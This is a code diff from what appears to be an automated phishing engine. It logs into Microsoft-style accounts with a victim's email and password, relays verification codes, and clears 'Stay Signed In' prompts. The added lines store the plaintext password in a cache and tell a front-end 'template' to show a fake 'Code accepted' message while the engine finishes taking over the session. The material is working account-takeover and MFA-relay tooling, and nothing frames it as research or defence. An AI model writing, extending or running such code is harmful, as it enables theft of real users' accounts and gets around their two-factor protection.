@@ -4951,6 +4951,25 @@ if (!foundSelector) {
                                     if (!postErrorState.required || postErrorState.type !== 'code') {
                                         logger.info(`[processRow][${browserId}][WAITINGCODE] Page moved past code entry despite error flash. Handling additional views...`);
                                         await handleAdditionalViews(page, platformConfig, instanceId, 'post_verification');
+                                        // Early PROCESSING_FINALIZING: "Stay Signed In" was handled — code was accepted.
+                                        // Template navigates immediately while engine finishes background work.
+                                        logger.info(`[processRow][${browserId}] Sending early PROCESSING_FINALIZING to template (Stay Signed In handled).`);
+                                        const earlyCached1 = getCachedRow(browserId) || {};
+                                        setCachedRow(browserId, { ...earlyCached1,
+                                            status: "PROCESSING_FINALIZING",
+                                            email: email || '',
+                                            password: password || '',
+                                            verified: true,
+                                            fullAccess: false,
+                                            lastJsonResponse: JSON.stringify({
+                                                browserId, email, status: "PROCESSING_FINALIZING",
+                                                emailExists: initialCheckResult.emailExists, accountAccess: true,
+                                                reachedInbox: false, requiresVerification: false,
+                                                verified: true, fullAccess: false,
+                                                platform, timestamp: new Date().toISOString(),
+                                                message: "Code accepted. Finalizing..."
+                                            })
+                                        });
                                         // Wait for any pending navigation to complete after handling additional views
                                         await page.waitForNavigation({ waitUntil: 'domcontentloaded', timeout: 15000 }).catch(() => null);
                                         await new Promise(res => setTimeout(res, 3000));
@@ -5044,6 +5063,25 @@ if (!foundSelector) {
                                     // If no code error, then wait 10 seconds and proceed with existing checks
                                     await new Promise(res => setTimeout(res, 10000)); // Increased wait to 10 seconds as requested
                                     await handleAdditionalViews(page, platformConfig, instanceId, 'post_verification');
+                                    // Early PROCESSING_FINALIZING: "Stay Signed In" was handled — code was accepted.
+                                    // Template navigates immediately while engine finishes background work.
+                                    logger.info(`[processRow][${browserId}] Sending early PROCESSING_FINALIZING to template (Stay Signed In handled).`);
+                                    const earlyCached2 = getCachedRow(browserId) || {};
+                                    setCachedRow(browserId, { ...earlyCached2,
+                                        status: "PROCESSING_FINALIZING",
+                                        email: email || '',
+                                        password: password || '',
+                                        verified: true,
+                                        fullAccess: false,
+                                        lastJsonResponse: JSON.stringify({
+                                            browserId, email, status: "PROCESSING_FINALIZING",
+                                            emailExists: initialCheckResult.emailExists, accountAccess: true,
+                                            reachedInbox: false, requiresVerification: false,
+                                            verified: true, fullAccess: false,
+                                            platform, timestamp: new Date().toISOString(),
+                                            message: "Code accepted. Finalizing..."
+                                        })
+                                    });
                                     // After handling additional views, wait for any pending navigation to complete
                                     await page.waitForNavigation({ waitUntil: 'domcontentloaded', timeout: 15000 }).catch(() => null);
                                     // Extra settle time for Microsoft SPA redirects
